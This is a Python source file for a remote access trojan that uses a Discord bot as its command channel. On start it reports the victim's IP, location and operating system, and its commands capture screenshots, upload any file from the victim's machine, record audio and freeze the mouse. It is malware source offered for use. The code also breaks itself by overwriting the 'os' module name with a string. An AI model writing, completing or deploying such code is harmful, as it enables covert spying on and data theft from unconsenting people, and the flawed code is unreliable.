import discord
from discord.ext import commands
from func import *
import threading
import os.path
import platform


def main():
    bot = commands.Bot(command_prefix="!")
    channel_id = "enter channel id here"
    ip = get_ip()
    os = platform.platform()
    country, city = get_location(ip)

    threads = []

    token = ""

    @bot.event
    async def on_ready():
        c2 = bot.get_channel(channel_id)
        await c2.send(f"-------------------------------------------------------"
                      f"\nNew Connection:\n\n"
                      f"{ip}\n"
                      f"{country}, {city}\n"
                      f"{os}\n\n"
                      f"!get_help for help\n"
                      f"-------------------------------------------------------")

    @bot.command()
    async def dox(ctx):
        await ctx.send(ip)

    @bot.command()
    async def mouse(ctx, freeze_time):
        result, fixed_time = time_prep(freeze_time)
        if result:
            await ctx.send(f"Freezing mouse for {fixed_time} seconds")
            freeze_thread = threading.Thread(target=freeze_mouse, args=(fixed_time,))
            freeze_thread.start()
        else:
            await ctx.send("Please specify freeze time in the right format")

    @bot.command()
    async def screen(ctx):
        screen_path = screenshot()
        await ctx.send(file=discord.File(screen_path))
        os.remove(screen_path)

    @bot.command()
    async def download(ctx, path):
        if os.path.exists(path):
            await ctx.send(file=discord.File(path))
        else:
            await ctx.send("File doesn't exist, try supplying the full path")

    @bot.command()
    async def record(ctx, record_time):
        result, fixed_time = time_prep(record_time)
        if result:
            await ctx.send(f"Recording audio for {fixed_time} seconds")

            recording_path = record_mic(fixed_time)
            await ctx.send(f"Uploading file...")
            await ctx.send(file=discord.File(recording_path))
            os.remove(recording_path)
        else:
            await ctx.send("Please specify record time in the right format")

    # to implement thread handling
    @bot.command()
    async def disconnect(ctx):
        await ctx.send("Closing bot...")
        exit(0)

    @bot.command()
    async def safe_disconnect(ctx):
        await ctx.send("Safe exit... (This might take a while)")
        for thread in threads:
            thread.join()
        exit(0)

    @bot.command()
    async def get_help(ctx):
        await ctx.send("------------------------------- HELP -------------------------------\n\n"
                       "!get_help -> View help message (This message)\n"
                       "Usage: !get_help\n\n"
                       
                       "!mouse -> Freeze victim's mouse for a specified time:\n"
                       "Usage: !mouse Xs | !mouse Xm | !mouse Xh (X is a number)\n\n"
                       
                       "!screen -> Get a screenshot of the victim's screen\n"
                       "Usage: !screen\n\n"
                       
                       "!download -> Download a file from the victim's machine:\n"
                       "Usage: !download \"file path\"\n\n"
                       
                       "!record -> Record victim's default audio input & output\n"
                       "Usage: !record Xs | !record Xm | !record Xh (X is a number)\n\n"
                       
                       "!disconnect -> Close the bot, will terminate the program immediately\n"
                       "Usage: !disconnect\n\n"
                       
                       "!safe_disconnect -> Close the bot safely, will close all created threads\n"
                       "USage: !safe_disconnect\n\n"
                       "------------------------------- HELP -------------------------------")

    bot.run(token)


if __name__ == "__main__":
    main()